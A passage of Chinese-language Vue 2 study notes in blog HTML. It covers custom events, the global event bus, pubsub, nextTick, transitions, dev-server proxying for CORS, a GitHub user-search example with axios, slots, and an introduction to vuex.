start="3"><li>想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</li></ol></li><li><p><strong>触发</strong>自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code></p></li><li><p><strong>解绑</strong>自定义事件：<code>this.$off(&#39;atguigu&#39;)</code></p></li><li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p></li></ol><p>注意：通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p><h2 id="全局事件总线"><a href="#全局事件总线" class="headerlink" title="全局事件总线"></a>全局事件总线</h2><p>一种组件间通信的方式，适用于<strong>任意组件间通信</strong>。</p><ol><li><p>安装全局事件总线：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>......<br><span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-title class_">Vue</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">$bus</span> = <span class="hljs-variable language_">this</span> <span class="hljs-comment">//安装全局事件总线，$bus就是当前应用的vm</span><br>&#125;,<br>    ......<br>&#125;) <br></code></pre></td></tr></table></figure></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">methods</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-title function_">demo</span>(<span class="hljs-params">data</span>)&#123;......&#125;<br>&#125;<br>......<br><span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">$bus</span>.$on(<span class="hljs-string">&#x27;xxxx&#x27;</span>,<span class="hljs-variable language_">this</span>.<span class="hljs-property">demo</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>提供数据：<code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code></p></li></ol></li><li><p>最好在beforeDestroy钩子中，用$off去<strong>解绑 当前组件所用到的事件</strong>。</p></li></ol><h2 id="消息定义与发布"><a href="#消息定义与发布" class="headerlink" title="消息定义与发布"></a>消息定义与发布</h2><p>案例使用api：pubsub</p><ul><li><p>安装：<code>npm i pubsub-js</code></p></li><li><p>使用：</p><ul><li><p>引入：<code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>订阅：<code>pubsub.subscribe(名字,回调函数)</code></p><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">pubId</span> = pubsub.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">msgName,data</span>)=&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;有人发布了hello消息，hello消息的回调执行了&#x27;</span>,msgName,data)<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>发布：<code>pubsub.publish(名字,数据)</code></p></li><li><p>取消订阅：<code>pubsub.unsubscribe(pid)</code></p></li></ul></li></ul><h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol><li>语法：**<code>this.$nextTick(回调函数)</code>**</li><li>作用：在<strong>下一次 DOM 更新结束后</strong>执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h2 id="过渡与动画"><a href="#过渡与动画" class="headerlink" title="过渡与动画"></a>过渡与动画</h2><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p><p><img src="https://v2.cn.vuejs.org/images/transition.png" alt="Transition Diagram"></p><p>与CSS3相关的知识：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@keyframes">@keyframes</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/animation">animation</a></p><p>案例：（点击按钮平滑切入，平滑切出）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- html --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isShow = !isShow&quot;</span>&gt;</span>显示/影藏<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">transition</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span>  <span class="hljs-attr">appear</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span>&gt;</span>你好啊<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">transition</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- style --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.hello-enter-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: atguigu <span class="hljs-number">1s</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.hello-leave-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">animation</span>: atguigu <span class="hljs-number">1s</span> reverse;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-keyword">@keyframes</span> atguigu &#123;</span><br><span class="language-css">    <span class="hljs-selector-tag">from</span>&#123;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">    <span class="hljs-selector-tag">to</span>&#123;</span><br><span class="language-css">        <span class="hljs-attribute">transform</span>:  <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0</span>);</span><br><span class="language-css">    &#125;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-comment">&lt;!-- style使用过渡写法 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: orange;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-comment">/* 进入的起点、离开的终点 */</span></span><br><span class="language-css"><span class="hljs-selector-class">.hello-enter</span>,<span class="hljs-selector-class">.hello-leave-to</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>);</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.hello-enter-active</span>,<span class="hljs-selector-class">.hello-leave-active</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">transition</span>: <span class="hljs-number">0.5s</span> linear;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-comment">/* 进入的终点、离开的起点 */</span></span><br><span class="language-css"><span class="hljs-selector-class">.hello-enter-to</span>,<span class="hljs-selector-class">.hello-leave</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0</span>);</span><br><span class="language-css"></span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>集成第三方动画api：<a href="https://animate.style/">animate.css</a></p><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> </span><br><span class="hljs-tag">                  <span class="hljs-attr">appear</span></span><br><span class="hljs-tag">                  <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;animate__animated animate__bounce&quot;</span> </span><br><span class="hljs-tag">                  <span class="hljs-attr">enter-active-class</span>=<span class="hljs-string">&quot;animate__swing&quot;</span></span><br><span class="hljs-tag">                  <span class="hljs-attr">leave-active-class</span>=<span class="hljs-string">&quot;animate__backOutUp&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>你好啊<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>尚硅谷<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="流程-amp-写法"><a href="#流程-amp-写法" class="headerlink" title="流程&amp;写法"></a>流程&amp;写法</h3><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;transition name=&quot;hello&quot;&gt;<br>&lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;<br>&lt;/transition&gt;<br></code></pre></td></tr></table></figure></li><li><p>备注：若有<strong>多个元素</strong>需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p></li></ol><h1 id="第四章：Vue中的ajax"><a href="#第四章：Vue中的ajax" class="headerlink" title="第四章：Vue中的ajax"></a>第四章：Vue中的ajax</h1><h2 id="Vue脚手架配置代理（解决跨域问题）"><a href="#Vue脚手架配置代理（解决跨域问题）" class="headerlink" title="Vue脚手架配置代理（解决跨域问题）"></a>Vue脚手架配置代理（解决跨域问题）</h2><p>直接请求数据，得到以下报错：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">已拦截跨源请求：同源策略禁止读取位于 http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">5000</span>/students 的远程资源。（原因：CORS 头缺少 <span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>）。状态码：<span class="hljs-number">200</span>。<br></code></pre></td></tr></table></figure><ul><li><p>Access-Control-Allow-Origin ：HTTP响应头，指定服务器端允许进行跨域资源访问的来源域。默认为不允许。</p></li><li><blockquote><p>同源策略（Same-origin policy）是一个<strong>浏览器安全机制</strong>，用于限制不同源之间的跨域操作。它是一种控制浏览器如何处理来自不同源的资源（例如文档、脚本、样式表和AJAX请求）的规则。</p><p>在同源策略中，如果两个URL具有相同的<strong>协议（protocol），主机（host）和端口号（port）</strong>，则它们被视为同源（origin）。</p></blockquote></li><li><p>解决跨域问题的三个方法</p><ol><li>cors</li><li>jsonp</li><li>代理</li></ol></li></ul><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>vue.config.js中添加如下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">proxy</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>优点：配置简单</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ul><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>vue.config.js配置具体代理规则：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><span class="hljs-attr">devServer</span>: &#123;<br>      <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api1&#x27;</span>: &#123;<span class="hljs-comment">// 匹配所有以 &#x27;/api1&#x27;开头的请求路径</span><br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5000&#x27;</span>,<span class="hljs-comment">// 代理目标的基础路径</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api1&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>      &#125;,<br>      <span class="hljs-string">&#x27;/api2&#x27;</span>: &#123;<span class="hljs-comment">// 匹配所有以 &#x27;/api2&#x27;开头的请求路径</span><br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:5001&#x27;</span>,<span class="hljs-comment">// 代理目标的基础路径</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123;<span class="hljs-string">&#x27;^/api2&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000</span><br><span class="hljs-comment">   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080</span><br><span class="hljs-comment">   changeOrigin默认值为true</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h2 id="github用户搜索案例"><a href="#github用户搜索案例" class="headerlink" title="github用户搜索案例"></a>github用户搜索案例</h2><p>效果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-12-04%20%E4%B8%8A%E5%8D%8811.01.10.png" alt="效果" style="zoom:50%;" /><p>拆分：搜索区（Search.vue)、List区(List.vue)</p><p>测试api：<a href="https://api.github.com/search/users?q=xxx">https://api.github.com/search/users?q=xxx</a></p><p>关键代码：</p><p>List.vue:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div class=&quot;row&quot;&gt;<br>        &lt;!-- 展示用户列表 --&gt;<br>        &lt;div class=&quot;card&quot; <br>        v-show=&quot;info.users.length&quot; <br>        v-for=&quot;user in info.users&quot; <br>        :key=&quot;user.login&quot;&gt;<br>            &lt;a :href=&quot;user.html_url&quot; target=&quot;_blank&quot;&gt;<br>            &lt;img :src=&quot;user.avatar_url&quot; style=&#x27;width: 100px&#x27;/&gt;<br>            &lt;/a&gt;<br>            &lt;p class=&quot;card-text&quot;&gt;&#123;&#123;user.login&#125;&#125;&lt;/p&gt;<br>        &lt;/div&gt;<br>        &lt;!-- 展示欢迎词 --&gt;<br>        &lt;h1 v-show=&quot;info.isFirst&quot;&gt;<br>            欢迎使用！<br>        &lt;/h1&gt;<br>        &lt;!-- 加载中 --&gt;<br>        &lt;h1 v-show=&quot;info.isLoading&quot;&gt;<br>            LOADING……<br>        &lt;/h1&gt;<br>        &lt;!-- 展示错误信息 --&gt;<br>        &lt;h1 v-show=&quot;info.errMsg&quot;&gt;<br>            &#123;&#123;info.errMsg&#125;&#125;<br>        &lt;/h1&gt;<br>    &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name:&#x27;List&#x27;,<br>    data()&#123;<br>        return&#123;<br>            info:&#123;<br>                isFirst:true,<br>                isLoading:false,<br>                errMsg:&#x27;&#x27;,<br>                users:[]<br>            &#125;,<br>        &#125;<br>    &#125;,<br>    mounted()&#123;<br>        this.$bus.$on(&#x27;updateListData&#x27;,(dataObj)=&gt;&#123;<br>            this.info = &#123;...this.info,...dataObj&#125;<br>        &#125;)<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br>&lt;!-- style省略 <br></code></pre></td></tr></table></figure><p>Search.vue:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;section class=&quot;jumbotron&quot;&gt;<br>      &lt;h3 class=&quot;jumbotron-heading&quot;&gt;Search Github Users&lt;/h3&gt;<br>      &lt;div&gt;<br>        &lt;input type=&quot;text&quot; placeholder=&quot;enter the name you search&quot; v-model=&quot;keyWord&quot; /&gt;&amp;nbsp;<br>        &lt;button @click=&quot;searchUsers&quot;&gt;Search&lt;/button&gt;<br>      &lt;/div&gt;<br>    &lt;/section&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import axios from &quot;axios&quot;;<br>export default &#123;<br>    name:&#x27;Search&#x27;,<br>    data()&#123;<br>        return&#123;<br>            keyWord:&#x27;&#x27;<br>        &#125;<br>    &#125;,<br>    methods:&#123;<br>        searchUsers()&#123;<br>            // 请求前更新List的数据<br>            this.$bus.$emit(&#x27;updateListData&#x27;,&#123;isFist:false,isLoading:true,errMsg:&#x27;&#x27;,users:[]&#125;)<br>            axios.get(`https://api.github.com/search/users?q=$&#123;this.keyWord&#125;`).then(<br>                response =&gt; &#123;<br>                    console.log(&#x27;请求成功，&#x27;)<br>                    this.$bus.$emit(&#x27;updateListData&#x27;,&#123;isLoading:false,errMsg:&#x27;&#x27;,users:response.data.items&#125;)<br><br>                &#125;,<br>                error =&gt; &#123;<br>                    console.log(&#x27;请求失败，&#x27;,)<br>                    this.$bus.$emit(&#x27;updateListData&#x27;,&#123;isLoading:false,errMsg:error.message,users:[]&#125;)<br><br>                &#125;<br>            )<br>        &#125;<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br>&lt;!-- style省略 <br></code></pre></td></tr></table></figure><h2 id="vue-项目中常用的-2-个-Ajax-库"><a href="#vue-项目中常用的-2-个-Ajax-库" class="headerlink" title="vue 项目中常用的 2 个 Ajax 库"></a>vue 项目中常用的 2 个 Ajax 库</h2><h3 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h3><p>通用的 Ajax 请求库, <strong>官方推荐</strong>，使用广泛。</p><h3 id="vue-resource"><a href="#vue-resource" class="headerlink" title="vue-resource"></a>vue-resource</h3><p>vue 插件库, vue1.x 使用广泛，<strong>官方已不维护</strong>。</p><h2 id="插槽slot"><a href="#插槽slot" class="headerlink" title="插槽slot"></a>插槽slot</h2><p><strong>作用</strong>：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 &#x3D;&#x3D;&#x3D;&gt; 子组件</strong> 。</p><p>分类：<strong>默认插槽、具名插槽、作用域插槽</strong></p><ol><li><p>默认插槽：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vue">父组件中：<br>        &lt;Category&gt;<br>           &lt;div&gt;html结构1&lt;/div&gt;<br>        &lt;/Category&gt;<br>子组件中：<br>        &lt;template&gt;<br>            &lt;div&gt;<br>               &lt;!-- 定义插槽 --&gt;<br>               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;<br>            &lt;/div&gt;<br>        &lt;/template&gt;<br></code></pre></td></tr></table></figure></li><li><p>具名插槽：</p><p><code>slot=&quot;xxx&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vue">父组件中：<br>        &lt;Category&gt;<br>            &lt;template slot=&quot;center&quot;&gt;<br>              &lt;div&gt;html结构1&lt;/div&gt;<br>            &lt;/template&gt;<br><br>            &lt;template v-slot:footer&gt;<br>               &lt;div&gt;html结构2&lt;/div&gt;<br>            &lt;/template&gt;<br>        &lt;/Category&gt;<br>子组件中：<br>        &lt;template&gt;<br>            &lt;div&gt;<br>               &lt;!-- 定义插槽 --&gt;<br>               &lt;slot name=&quot;center&quot;&gt;插槽默认内容...&lt;/slot&gt;<br>               &lt;slot name=&quot;footer&quot;&gt;插槽默认内容...&lt;/slot&gt;<br>            &lt;/div&gt;<br>        &lt;/template&gt;<br></code></pre></td></tr></table></figure></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vue">父组件中：<br>&lt;Category&gt;<br>  &lt;template scope=&quot;scopeData&quot;&gt;<br>&lt;!-- 生成的是ul列表 --&gt;<br>&lt;ul&gt;<br>  &lt;li v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/template&gt;<br>&lt;/Category&gt;<br><br>&lt;Category&gt;<br>  &lt;template slot-scope=&quot;scopeData&quot;&gt;<br>&lt;!-- 生成的是h4标题 --&gt;<br>&lt;h4 v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/h4&gt;<br>  &lt;/template&gt;<br>&lt;/Category&gt;<br><br><br>子组件中：<br>&lt;template&gt;<br>&lt;div&gt;<br>  &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br>&lt;script&gt;<br>  export default &#123;<br>    name:&#x27;Category&#x27;,<br>    props:[&#x27;title&#x27;],<br>    //数据在子组件自身<br>    data() &#123;<br>      return &#123;<br>        games:[&#x27;红色警戒&#x27;,&#x27;穿越火线&#x27;,&#x27;劲舞团&#x27;,&#x27;超级玛丽&#x27;]<br>      &#125;<br>    &#125;,<br>  &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="第五章：vuex"><a href="#第五章：vuex" class="headerlink" title="第五章：vuex"></a>第五章：vuex</h1><h2 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h2><p>概念：</p><p>在Vue中实现<strong>集中式</strong>状态（数据）<strong>管理</strong>的一个Vue<strong>插件</strong>，对vue应用中多个组件的共享状态进行集中式的管理（读&#x2F;写），也是一种组件间通信的方式，且<strong>适用于任意组件间通信</strong>。</p><p>github地址：<a href="https://github.com/vuejs/vuex">https://github.com/vuejs/vuex</a></p><p>何时使用：多个组件需要共享数据时</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>Webpack</p><p>axios</p><blockquote><p>Axios，基于 Promise 的 HTTP 客户端，可以工作于浏览器中，也可以在 node.js 中使用。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a 